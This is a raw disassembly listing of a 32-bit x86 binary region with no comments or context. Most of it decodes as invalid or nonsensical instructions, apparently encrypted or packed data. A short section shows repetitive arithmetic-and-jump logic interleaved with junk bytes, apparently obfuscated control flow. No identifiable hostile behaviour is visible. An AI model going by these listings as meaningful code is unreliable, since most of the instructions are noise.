  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403a95
  403acb:	popf   
  403acc:	inc    edi
  403acd:	cmp    al,0x20
  403acf:	adc    BYTE PTR [esi+0x7e],bh
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403af9
  403ad7:	sub    al,0xd5
  403ad9:	xor    BYTE PTR [eax-0x35],ah
  403adc:	adc    ax,0xdcc6
  403ae0:	fldcw  WORD PTR [esi-0x45]
  403ae3:	repz pop eax
  403ae5:	inc    edi
  403ae6:	jnp    0x403a91
  403ae8:	sbb    dh,0x4b
  403aeb:	xchg   ebx,eax
  403aec:	stos   DWORD PTR es:[edi],eax
  403aed:	ja     0x403b36
  403aef:	mov    ebx,0x3e9a44f5
  403af4:	or     ebx,DWORD PTR [ebp+ecx*4+0x33]
  403af8:	lahf   
  403af9:	xchg   ebx,eax
  403afa:	mov    al,0xc3
  403afc:	fs jge 0x403afc
  403aff:	mov    ch,0x3d
  403b01:	fldcw  WORD PTR [ebx+0x3b]
  403b04:	test   eax,0x9902941e
  403b09:	mov    BYTE PTR ds:0xf3546169,ah
  403b0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b10:	addr16 gs mov cl,0x3
  403b14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b15:	shl    BYTE PTR [ebp-0xd5bf22b],1
  403b1b:	test   eax,0xa2bcd064
  403b20:	test   eax,0xa4da5f8a
  403b25:	fs das 
  403b27:	stos   BYTE PTR es:[edi],al
  403b28:	mov    BYTE PTR [edi+0x3c31c120],0xde
  403b2f:	push   esi
  403b30:	adc    DWORD PTR [ebp-0xc0c60c2],0x5f
  403b37:	mov    al,al
  403b39:	std    
  403b3a:	icebp  
  403b3b:	retf   0xdc1b
  403b3e:	push   0x50
  403b40:	adc    al,0x20
  403b42:	sub    DWORD PTR [edi+0x29],ecx
  403b45:	mov    WORD PTR [eax+0x40b24e29],ds
  403b4b:	not    DWORD PTR [edi+esi*8+0x6]
  403b4f:	idiv   BYTE PTR [eax-0x4]
  403b52:	mov    ebx,ds
  403b54:	xor    al,0xf8
  403b56:	adc    eax,0x40e7b76a
  403b5b:	in     al,0x22
  403b5d:	cmp    al,0xa8
  403b5f:	arpl   WORD PTR [edi+0x36479433],cx
  403b65:	mov    edi,0x3514de6f
  403b6a:	push   0xb1a80ca9
  403b6f:	adc    al,0x6a
  403b71:	(bad)  
  403b72:	aam    0x23
  403b74:	sbb    eax,DWORD PTR [ecx-0x5d]
  403b77:	nop
  403b78:	lock dec ebx
  403b7a:	mov    dh,0xf5
  403b7c:	mov    ah,BYTE PTR [eax+0x12e0bfa2]
  403b82:	xor    BYTE PTR [ebx-0x523fe4db],al
  403b88:	and    al,0xb8
  403b8a:	mov    ecx,0xf3299e22
  403b8f:	pop    esp
  403b90:	dec    edx
  403b91:	add    edi,DWORD PTR [edx+0x135f7ad]
  403b97:	push   eax
  403b98:	and    ebx,DWORD PTR [eax+0x58]
  403b9b:	push   esp
  403b9c:	ret    
  403b9d:	xor    DWORD PTR [edx+0x77489f8c],0xc6bd0a83
  403ba7:	scas   al,BYTE PTR es:[edi]
  403ba8:	jecxz  0x403b89
  403baa:	pop    edx
  403bab:	cmp    eax,0x5062d3a3
  403bb0:	pushf  
  403bb1:	jmp    0xc13:0xac4a762f
  403bb8:	dec    edx
  403bb9:	icebp  
  403bba:	add    eax,0x83ba5317
  403bbf:	mov    edi,DWORD PTR [ebx+esi*1-0x2dd25382]
  403bc6:	fiadd  DWORD PTR [edx]
  403bc8:	pop    ss
  403bc9:	push   0x1fdc540d
  403bce:	push   ds
  403bcf:	xchg   BYTE PTR [edi+ecx*4+0x238be706],bl
  403bd6:	mov    BYTE PTR [ebp-0x4bb2ed88],ch
  403bdc:	jb     0x403bde
  403bde:	loopne 0x403baa
  403be0:	add    bl,ah
  403be2:	dec    eax
  403be3:	or     ebx,ebp
  403be5:	inc    ecx
  403be6:	jg     0x403bfd
  403be8:	ja     0x403bd3
  403bea:	push   cs
  403beb:	shl    eax,cl
  403bed:	fld    st(2)
  403bef:	shl    BYTE PTR [eax+0x24f142e7],0x8f
  403bf6:	leave  
  403bf7:	leave  
  403bf8:	nop
  403bf9:	sbb    dl,BYTE PTR [ebp-0x19]
  403bfc:	fwait
  403bfd:	mov    ebp,0x8119f241
  403c02:	rcr    dh,1
  403c04:	dec    esp
  403c05:	(bad)  
  403c07:	add    al,0x1c
  403c09:	shl    eax,1
  403c0b:	sbb    BYTE PTR [esi+0x4a],cl
  403c0e:	pop    es
  403c0f:	xor    ebx,edx
  403c11:	(bad)  
  403c12:	pop    edi
  403c13:	mov    WORD PTR [ecx-0x9c6a290],?
  403c19:	fdivr  st(3),st
  403c1b:	jo     0x403bfa
  403c1d:	(bad)  
  403c1f:	and    esi,DWORD PTR [ebx]
  403c21:	xchg   DWORD PTR [ebx+0x3a],esi
  403c24:	push   cs
  403c25:	ficom  WORD PTR [edx]
  403c27:	sbb    BYTE PTR [ebp+0x4f94a13c],ah
  403c2d:	pop    ss
  403c2e:	mov    bl,0xa
  403c30:	(bad)  
  403c31:	call   0xc5c6:0xb00a058c
  403c38:	mov    WORD PTR [ecx-0x5b2f68a8],cs
  403c3e:	je     0x403cab
  403c40:	inc    edi
  403c41:	sbb    edi,DWORD PTR [ebx-0x6e467f0]
  403c47:	fdiv   QWORD PTR [eax+0x20]
  403c4a:	scas   eax,DWORD PTR es:[edi]
  403c4b:	test   eax,0x6f45686
  403c50:	mov    ah,0xf9
  403c52:	push   ebx
  403c53:	into   
  403c54:	push   ds
  403c55:	in     al,dx
  403c56:	pop    bx
  403c58:	in     al,dx
  403c59:	cdq    
  403c5a:	pop    esi
  403c5b:	popf   
  403c5c:	lods   eax,DWORD PTR ds:[esi]
  403c5d:	pop    ebx
  403c5e:	aad    0xfc
  403c60:	mov    bh,0x29
  403c62:	sbb    edx,edi
  403c64:	pop    esp
  403c65:	push   ebx
  403c66:	nop
  403c67:	sub    DWORD PTR [esi-0x6d],0x3
  403c6b:	xchg   ecx,eax
  403c6c:	add    eax,0x282f5c0e
  403c71:	push   esi
  403c72:	dec    esp
  403c73:	pop    ebx
  403c74:	mov    ss,WORD PTR [edx+0x1826e02e]
  403c7a:	mov    ebp,0x3fc548df
  403c7f:	in     al,dx
  403c80:	pushf  
  403c81:	fadd   DWORD PTR [ecx-0x1fcb6886]
  403c87:	sub    al,0x17
  403c89:	push   ebx
  403c8a:	pop    edi
  403c8b:	lds    esp,FWORD PTR [ebx+esi*8-0x256fafe5]
  403c92:	je     0x403ca2
  403c94:	shl    ah,cl
  403c96:	inc    esi
  403c97:	adc    dh,BYTE PTR [eax-0xf]
  403c9a:	sub    BYTE PTR [eax],al
  403c9c:	stc    
  403c9d:	inc    esi
  403c9e:	fsubrp st(1),st
  403ca0:	inc    esp
  403ca1:	clc    
  403ca2:	or     al,0xca
  403ca4:	sahf   
  403ca5:	jns    0x403ccb
  403ca7:	call   0x1537:0x236b14b8
  403cae:	adc    BYTE PTR [eax+0x601ca9f1],0xc4
  403cb5:	nop
  403cb6:	iret   
  403cb7:	xchg   esp,eax
  403cb8:	mov    BYTE PTR [ebp-0x2b],ah
  403cbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cbc:	jbe    0x403d21
  403cbe:	sbb    ah,cl
  403cc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cc1:	mov    ebp,DWORD PTR [ecx]
  403cc3:	mov    al,BYTE PTR [ecx]
  403cc5:	inc    esp
  403cc6:	in     eax,dx
  403cc7:	stos   BYTE PTR es:[edi],al
  403cc8:	dec    edi
  403cc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cca:	popf   
  403ccb:	cmp    bh,ch
  403ccd:	sbb    BYTE PTR [eax+0x30873ee4],0x0
  403cd4:	cs cwde 
  403cd6:	pusha  
  403cd7:	xchg   esi,eax
  403cd8:	jge    0x403d03
  403cda:	inc    cl
  403cdc:	fmul   QWORD PTR [ecx-0x17d326e0]
  403ce2:	sub    esp,ebx
  403ce4:	out    dx,al
  403ce5:	cmp    BYTE PTR [ebp+0x2613641e],dh
  403ceb:	mov    ebp,0x52a19c1f
  403cf0:	pop    ds
  403cf1:	mov    al,0x66
  403cf3:	cli    
  403cf4:	test   BYTE PTR [edx-0x14],ch
  403cf7:	sti    
  403cf8:	push   es
  403cf9:	cdq    
  403cfa:	cld    
  403cfb:	sbb    BYTE PTR [edx-0x2b],cl
  403cfe:	push   ebx
  403cff:	outs   dx,BYTE PTR ds:[esi]
  403d00:	inc    ebp
  403d01:	add    BYTE PTR [ecx-0x5169c32],ah
  403d07:	or     DWORD PTR [edi],0xd5350e61
  403d0d:	in     eax,dx
  403d0e:	mov    eax,0x7e493e27
  403d13:	dec    eax
  403d14:	sub    BYTE PTR [ecx+0xa1f7a96],bl
  403d1a:	fisubr DWORD PTR [edi+ebp*8-0x6b521949]
  403d21:	dec    edx
  403d22:	xchg   ebp,eax
  403d23:	popf   
  403d24:	cld    
  403d25:	and    BYTE PTR [ebx],0x29
  403d28:	(bad)  
  403d29:	pop    esp
  403d2a:	mov    bl,0xd1
  403d2c:	push   eax
  403d2d:	aam    0xe
  403d2f:	stos   DWORD PTR es:[edi],eax
  403d30:	pop    ecx
  403d31:	int    0x32
  403d33:	retf   0xbf7a
  403d36:	ror    BYTE PTR [esi-0x48],cl
  403d39:	or     BYTE PTR [edx-0x60cd9338],ah
  403d3f:	inc    edi
  403d40:	clc    
  403d41:	cli    
  403d42:	push   0xeab07628
  403d47:	js     0x403d9f
  403d49:	pop    ecx
  403d4a:	adc    al,0x85
  403d4c:	add    DWORD PTR [edx+esi*2-0x36],esi
  403d50:	loop   0x403cec
  403d52:	jb     0x403d7d
  403d54:	pop    ebx
  403d55:	je     0x403dd1
  403d57:	fwait
  403d58:	hlt    
  403d59:	rcr    DWORD PTR ds:0xe6a49a27,0xb
  403d60:	mov    dl,0xee
  403d62:	mov    ecx,0x17bdbec
  403d67:	pop    esp
  403d68:	loopne 0x403de9
  403d6a:	out    dx,al
  403d6b:	je     0x403cf5
  403d6d:	fwait
  403d6e:	push   es
  403d6f:	inc    eax
  403d70:	sbb    eax,0x32e12f47
  403d75:	mov    cl,0xb8
  403d77:	scas   eax,DWORD PTR es:[edi]
  403d78:	xchg   ebx,ebp
  403d7a:	sub    eax,0xac4bc8c7
  403d7f:	xchg   ebx,eax
  403d80:	dec    esi
  403d81:	dec    edx
  403d82:	loop   0x403da2
  403d84:	fwait
  403d85:	(bad)  
  403d86:	pop    esi
  403d87:	pop    eax
  403d88:	je     0x403df9
  403d8a:	lds    edi,FWORD PTR [edx-0x1265d191]
  403d90:	xor    ebx,ecx
  403d92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d93:	inc    esp
  403d94:	push   eax
  403d96:	sahf   
  403d97:	and    edx,DWORD PTR [esp+edi*4-0x33]
  403d9b:	push   eax
  403d9c:	jle    0x403d50
  403d9e:	add    BYTE PTR [ebx-0x4ad80958],al
  403da4:	repz or BYTE PTR [esi+0x218b6fb7],bl
  403dab:	mov    dl,0x2d
  403dad:	repz jno 0x403d31
  403db0:	js     0x403ddc
  403db2:	(bad)  
  403db3:	push   0xf
  403db5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403db6:	pop    ebx
  403db7:	cld    
  403db8:	stc    
  403db9:	mov    ebx,0x5d8bde8e
  403dbe:	lock sub ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0x14
  403e75:	mov    ah,0xbc
  403e77:	mov    esp,0x7e7e1f0a
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403e2c
  403e81:	int3   
  403e82:	xor    dl,BYTE PTR [esi+0x76]
  403e85:	ins    BYTE PTR es:[edi],dx
  403e86:	nop
  403e87:	and    eax,0x10d0231a
  403e8c:	mov    bl,0x63
  403e8e:	inc    ecx
  403e8f:	adc    al,0x9a
  403e91:	repz addr16 repnz das 
  403e95:	mov    al,ds:0xe894f03b
  403e9a:	jns    0x403e20
  403e9c:	ds scas al,BYTE PTR es:[edi]
  403e9e:	xlat   BYTE PTR ds:[ebx]
  403e9f:	stc    
  403ea0:	sub    dh,BYTE PTR [ecx+esi*4-0x3]
  403ea4:	and    al,0xbc
  403ea6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ea7:	fild   WORD PTR [esi]
  403ea9:	addr16 aas 
  403eab:	cwde   
  403eac:	popa   
  403ead:	jnp    0x403e39
  403eaf:	in     al,dx
  403eb0:	fcos   
  403eb2:	(bad)  
  403eb3:	cwde   
  403eb4:	fbstp  TBYTE PTR [edi+0x7389eef9]
  403eba:	push   ds
  403ebb:	sahf   
  403ebc:	or     DWORD PTR [ecx+0x791dec07],eax
  403ec2:	and    esp,0xefaabca4
  403ec8:	scas   eax,DWORD PTR es:[edi]
  403ec9:	fstp   TBYTE PTR [ebx+0x57]
  403ecc:	out    0x84,eax
  403ece:	nop
  403ecf:	mov    ah,0xaa
  403ed1:	push   esi
  403ed2:	sti    
  403ed3:	xor    DWORD PTR [edx+0xa3db5cd],ecx
  403ed9:	rcl    DWORD PTR [ebp-0x96da6a7],cl
  403edf:	loope  0x403f2e
  403ee1:	inc    ebp
  403ee2:	jo     0x403f3f
  403ee4:	pop    ecx
  403ee5:	mov    eax,ds:0x4e289aa4
  403eea:	out    0xf0,al
  403eec:	xchg   ecx,eax
  403eed:	popa   
  403eee:	inc    ebx
  403eef:	ss mov ch,0x1c
  403ef2:	fsub   DWORD PTR [ecx-0x167d0ca0]
  403ef8:	dec    esi
  403ef9:	frstpm(287 only) 
  403efc:	cmc    
  403efd:	pop    ebp
  403efe:	mov    ah,0x2e
  403f00:	ins    DWORD PTR es:[edi],dx
  403f01:	(bad)  
  403f02:	mov    al,0xd9
  403f04:	mov    ds:0xcdcc88a,al
  403f09:	aaa    
  403f0a:	ret    0x5725
  403f0d:	loop   0x403f20
  403f0f:	outs   dx,BYTE PTR ds:[esi]
  403f10:	adc    al,0x63
  403f12:	pop    esi
  403f13:	mov    bh,0xee
  403f15:	inc    esp
  403f16:	je     0x403f60
  403f18:	mov    edx,0xab6ae17f
  403f1d:	xor    edi,DWORD PTR [eax]
  403f1f:	dec    ecx
  403f20:	lea    esp,[edx+0x926beeb]
  403f26:	int3   
  403f27:	call   0x7515:0x87d92908
  403f2e:	or     edi,ecx
  403f30:	sbb    BYTE PTR [eax+ebx*4],al
  403f33:	in     al,0x6c
  403f35:	sbb    dh,BYTE PTR [ebp+0x3]
  403f38:	pop    eax
  403f39:	sar    BYTE PTR [eax],1
  403f3b:	mov    ebx,edi
  403f3d:	dec    ecx
  403f3e:	adc    al,0x5f
  403f40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f41:	xchg   BYTE PTR ss:[ebp-0x2326162e],cl
  403f48:	lds    edi,FWORD PTR [ebx-0x54]
  403f4b:	ja     0x403f03
  403f4d:	or     eax,0x55336dc5
  403f52:	repnz popf 
  403f54:	test   BYTE PTR [ebp-0x4c],bl
  403f57:	gs js  0x403fb2
  403f5a:	js     0x403f7b
  403f5c:	fcmovbe st,st(1)
  403f5e:	imul   ebx,edi,0x3d3bb269
  403f64:	jns    0x403f60
  403f66:	sub    ah,BYTE PTR [esp+ebx*1]
  403f69:	out    0x1f,al
  403f6b:	jle    0x403fb6
  403f6d:	leave  
  403f6e:	cmp    esi,ebp
  403f70:	sbb    al,0xf3
  403f72:	mov    WORD PTR [esi+esi*8],gs
  403f75:	lods   al,BYTE PTR ds:[esi]
  403f76:	out    0xa6,eax
  403f78:	pop    ebp
  403f79:	cs push cs
  403f7b:	pop    ebp
  403f7c:	dec    ebx
  403f7d:	(bad)  
  403f7e:	jne    0x403f35
  403f80:	leave  
  403f81:	cmp    al,0x21
  403f83:	pusha  
  403f84:	fcom   DWORD PTR [edx+0x5]
  403f87:	dec    ebp
  403f88:	xor    edi,DWORD PTR [ebx]
  403f8a:	push   es
  403f8b:	pop    ss
  403f8c:	sbb    al,0x4b
  403f8e:	and    eax,DWORD PTR [ecx]
  403f90:	into   
  403f91:	push   ebx
  403f92:	(bad)  
  403f93:	(bad)  
  403f94:	daa    
  403f95:	lea    ebp,[edx-0x10]
  403f98:	fldcw  WORD PTR [esi]
  403f9a:	jge    0x403f3e
  403f9c:	shr    DWORD PTR [ecx],1
  403f9e:	cdq    
  403f9f:	or     ah,ch
  403fa1:	jmp    0x599b73d0
  403fa6:	iret   
  403fa7:	sub    al,0xe7
  403fa9:	and    cl,0x17
  403fac:	or     bl,BYTE PTR [ebx+edi*1+0x13e5888b]
  403fb3:	pop    eax
  403fb4:	xor    DWORD PTR [ebx],0x6c
  403fb7:	std    
  403fb8:	pop    ecx
  403fb9:	(bad)  [esi+0x6453ea87]
  403fbf:	je     0x403ff4
  403fc1:	dec    esp
  403fc2:	sbb    ah,ch
  403fc4:	pop    edx
  403fc5:	cmp    al,BYTE PTR [eax-0x7f]
  403fc8:	and    DWORD PTR [ebx+esi*1],0x29
  403fcc:	ss push 0xfffffffc
  403fcf:	and    BYTE PTR [esi+ebp*1+0x35bbf593],dl
  403fd6:	bound  ebp,QWORD PTR [ebx-0xcc2984d]
  403fdc:	int3   
  403fdd:	xchg   ecx,eax
  403fde:	gs sahf 
  403fe0:	sbb    ch,BYTE PTR [esi+0x1a6b2281]
  403fe6:	or     ebx,DWORD PTR [di]
  403fe9:	aam    0x5
  403feb:	aas    
  403fec:	addr16 pop esi
  403fee:	daa    
  403fef:	add    eax,0xed3546e5
  403ff4:	jae    0x404058
  403ff6:	push   ebp
  403ff7:	cmp    eax,0x90df49ca
  403ffc:	push   0xc
  403ffe:	fiadd  DWORD PTR [ebp-0x21589bf0]
  404004:	dec    edi
  404005:	adc    al,0x43
  404007:	out    dx,al
  404008:	(bad)  
  404009:	pusha  
  40400a:	mov    cl,0xbd
  40400c:	mov    al,0xac
  40400e:	imul   ecx,DWORD PTR [eax],0xf421ddf7
  404014:	lods   eax,DWORD PTR ds:[esi]
  404015:	pop    esp
  404016:	cmp    dl,BYTE PTR ds:0x308476e7
  40401c:	xor    BYTE PTR ds:0x6be9fba5,bh
  404022:	dec    ecx
  404023:	push   edx
  404024:	mov    cl,0xd2
  404026:	pop    ss
  404027:	push   es
  404028:	or     al,0xd8
  40402a:	repz inc esp
  40402c:	xor    BYTE PTR [ebx-0x75],ch
  40402f:	xchg   esi,eax
  404030:	paddsb mm2,QWORD PTR [esi+edx*2]
  404034:	(bad)  
  404035:	fs xchg ebx,eax
  404037:	adc    eax,0x1a
  40403a:	cdq    
  40403b:	mov    ebp,0x36dddb02
  404040:	popa   
  404041:	xor    DWORD PTR [edx],ecx
  404043:	retf   
  404044:	sbb    ebp,esi
  404046:	inc    edx
  404047:	lods   eax,DWORD PTR ds:[esi]
  404048:	adc    bl,al
  40404a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40404b:	mov    ds:0x66612287,eax
  404050:	sub    al,0x2
  404052:	inc    edx
  404053:	mov    esp,0x30c45457
  404058:	cmp    eax,0xe7575094
  40405d:	sahf   
  40405e:	call   0xa8055f54
  404063:	fmul   QWORD PTR [ecx+ecx*4-0x152073c3]
  40406a:	xchg   BYTE PTR [eax+ebp*2],ch
  40406d:	(bad)  
  40406e:	ror    dh,cl
  404070:	(bad)  
  404071:	popf   
  404072:	fs icebp 
  404074:	inc    ebp
  404075:	dec    ebp
  404076:	in     eax,0xb7
  404078:	rol    DWORD PTR [edx+eax*1+0x33],1
  40407c:	adc    BYTE PTR [ebx],ah
  40407e:	imul   esp,DWORD PTR [ebx+0x1bbb32d5],0x69
  404085:	not    BYTE PTR ds:[eax+0x27]
  404089:	(bad)  
  40408d:	sub    al,0xdf
  40408f:	ds retf 
  404091:	adc    ecx,esp
  404093:	dec    ecx
  404094:	mov    cs,WORD PTR [ebx-0x5459f7ca]
  40409a:	sub    al,0xed
  40409c:	cs sahf 
  40409e:	mov    edi,ds
  4040a0:	rcr    DWORD PTR [ebp-0x8],1
  4040a3:	and    edx,DWORD PTR [eax-0x507c05cf]
  4040a9:	es pop esp
  4040ab:	xchg   edi,eax
  4040ac:	sub    ecx,eax
  4040ae:	js     0x40407e
  4040b0:	push   cs
  4040b1:	fmulp  st(0),st
  4040b3:	and    DWORD PTR [ecx-0x3c],eax
  4040b6:	or     eax,0x40d518e8
  4040bb:	and    DWORD PTR [edi+ebp*4],edx
  4040be:	lock call 0x23d9b6
  4040c4:	push   cs
  4040c5:	jl     0x4040ea
  4040c7:	stos   DWORD PTR es:[edi],eax
  4040c8:	add    al,dl
  4040ca:	jecxz  0x404146
  4040cc:	xor    eax,0x1106c4b5
  4040d1:	pop    ebx
  4040d2:	dec    esi
  4040d3:	dec    ecx
  4040d4:	pop    esi
  4040d5:	(bad)  
  4040d6:	shl    BYTE PTR [edi-0x42],cl
  4040d9:	push   ebx
  4040da:	std    
  4040db:	sahf   
  4040dc:	push   es
  4040dd:	lods   eax,DWORD PTR ds:[esi]
  4040de:	push   cs
  4040df:	inc    ebx
  4040e0:	mov    DWORD PTR [ecx+edx*4+0x55],edi
  4040e4:	mov    bl,0xa6
  4040e6:	xor    al,0x12
  4040e8:	xchg   esi,eax
  4040e9:	mov    WORD PTR [eax+0x3a],fs
  4040ec:	xchg   ebx,eax
  4040ed:	xor    bh,BYTE PTR [edi]
  4040ef:	inc    dh
  4040f1:	das    
  4040f2:	hlt    
  4040f3:	(bad)  
  4040f4:	retf   
  4040f5:	cdq    
  4040f6:	aam    0xdf
  4040f8:	jno    0x404140
  4040fa:	test   eax,0xf1a2f5ef
  4040ff:	jmp    0xa61e2460
  404104:	popa   
  404105:	iret   
  404106:	stos   DWORD PTR es:[edi],eax
  404107:	repz js 0x4040e0
  40410a:	idiv   DWORD PTR [ecx]
  40410c:	push   ss
  40410d:	adc    edi,DWORD PTR [eax-0x7d3c61e3]
  404113:	pushf  
  404114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404115:	shl    dh,1
  404117:	ins    BYTE PTR es:[edi],dx
  404118:	leave  
  404119:	mov    ds:0x3525660d,al
  40411e:	mov    dl,0xf7
  404120:	ficomp DWORD PTR [eax+esi*4-0x5e610edd]
  404127:	cmc    
  404128:	adc    eax,0x7d6e870e
  40412d:	inc    edi
  40412e:	aam    0x45
  404130:	jnp    0x40410b
  404132:	enter  0xf4c0,0x1a
  404136:	ret    0x767f
  404139:	mov    ecx,0xcb1fe89b
  40413e:	test   BYTE PTR [eax],ch
  404140:	dec    edx
  404141:	jl     0x404112
  404143:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404144:	add    eax,DWORD PTR [edi+ecx*8]
  404147:	call   0x391d:0xcc1bd70e
  40414e:	cmp    DWORD PTR [edi+0x57],ebp
  404151:	mov    esp,0xa888aa20
  404156:	cli    
  404157:	adc    ch,BYTE PTR [edi-0x41]
  40415a:	jp     0x40417f
  40415c:	sbb    DWORD PTR [esi+0x434afb7e],ebx
  404162:	popf   
  404163:	mov    bh,0xec
  404165:	and    BYTE PTR [ebx],ch
  404167:	fistp  QWORD PTR [ebx]
  404169:	fimul  DWORD PTR [ebx-0x79f037ab]
  40416f:	add    eax,DWORD PTR [eax]
  404171:	add    BYTE PTR [eax],al
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [esi+0x74bc52ba],dl
  40418f:	sbb    eax,0x7c587e7e
  404194:	jle    0x404214
  404196:	mov    ebp,0x9fcc4392
  40419b:	fwait
  40419c:	mov    ebp,0xf6455188
  4041a1:	arpl   WORD PTR [ebx-0x16dc97d1],dx
  4041a7:	dec    edi
  4041a8:	sbb    al,0x30
  4041aa:	xchg   ebx,eax
  4041ab:	and    DWORD PTR [eax+0x6b7f1347],ebp
  4041b1:	repz adc al,0x9b
  4041b4:	adc    eax,esp
  4041b6:	pop    ebx
  4041b7:	sbb    BYTE PTR [ecx+0x7dd75d8e],ch
  4041bd:	sub    ebx,DWORD PTR [ebx-0x6b]
  4041c0:	jecxz  0x4041e2
  4041c2:	outs   dx,DWORD PTR ds:[esi]
  4041c3:	xchg   ecx,eax
  4041c4:	or     eax,0xd4067f30
  4041c9:	int3   
  4041ca:	add    eax,0x42d12aa7
  4041cf:	aas    
  4041d0:	imul   edi,DWORD PTR [edi+0x7a820029],0x58
  4041d7:	jae    0x404226
  4041d9:	dec    esi
  4041da:	aad    0x3d
  4041dc:	test   esi,esi
  4041de:	call   0xa0a40cdf
  4041e3:	xchg   DWORD PTR [ebp+0x5479a2ac],ecx
  4041e9:	cmp    esp,DWORD PTR [edx-0x80]
  4041ec:	add    al,0xbf
  4041ee:	pop    ss
  4041ef:	or     cl,dl
  4041f1:	inc    ebp
  4041f2:	(bad)  
  4041f4:	cdq    
  4041f5:	mov    edi,0x31490c9b
  4041fa:	in     al,0xaa
  4041fc:	xchg   ebp,eax
  4041fd:	adc    cl,BYTE PTR [ebp+0x5f]
  404200:	add    ecx,edi
  404202:	in     al,0x15
  404204:	test   eax,0xb215acf5
  404209:	pushf  
  40420a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40420b:	outs   dx,BYTE PTR ds:[esi]
  40420c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40420d:	inc    DWORD PTR [ecx]
  40420f:	or     eax,0xdffa082f
  404214:	nop
  404215:	jmp    0xc292563e
  40421a:	ret    0xcf9b
  40421d:	mov    ah,0xb6
  40421f:	mov    bh,0xc8
  404221:	das    
  404222:	adc    dh,BYTE PTR [edi+0x23]
  404225:	jle    0x404247
  404227:	xchg   esp,eax
  404228:	fist   DWORD PTR [edx+0x9c3de85]
  40422e:	ds xchg edx,eax
  404230:	cmp    edi,ebp
  404232:	sub    al,0xd3
  404234:	jbe    0x40425b
  404236:	pushf  
  404237:	cbw    
  404239:	js     0x404252
  40423b:	test   eax,0xf7ccb1b3
  404240:	jecxz  0x4042b0
  404242:	mov    ah,BYTE PTR [edi]
  404244:	mov    al,0x1c
  404246:	xlat   BYTE PTR ds:[ebx]
  404247:	mov    ch,0xb4
  404249:	test   esp,eax
  40424b:	xlat   BYTE PTR ds:[bx]
  40424d:	push   ebx
  40424e:	enter  0x2e03,0xa5
  404252:	fsub   st(6),st
  404254:	ret    0x6b11
  404257:	and    al,0x89
  404259:	xor    ch,BYTE PTR cs:[ebx]
  40425c:	loope  0x404259
  40425e:	(bad)  
  40425f:	or     BYTE PTR [ecx-0x3c],ch
  404262:	(bad)  
  404263:	lock out 0x9a,eax
  404266:	test   eax,0x1d30e7f6
  40426b:	fwait
  40426c:	or     DWORD PTR [edi-0x11718b3b],ebp
  404272:	fcom   DWORD PTR [edx]
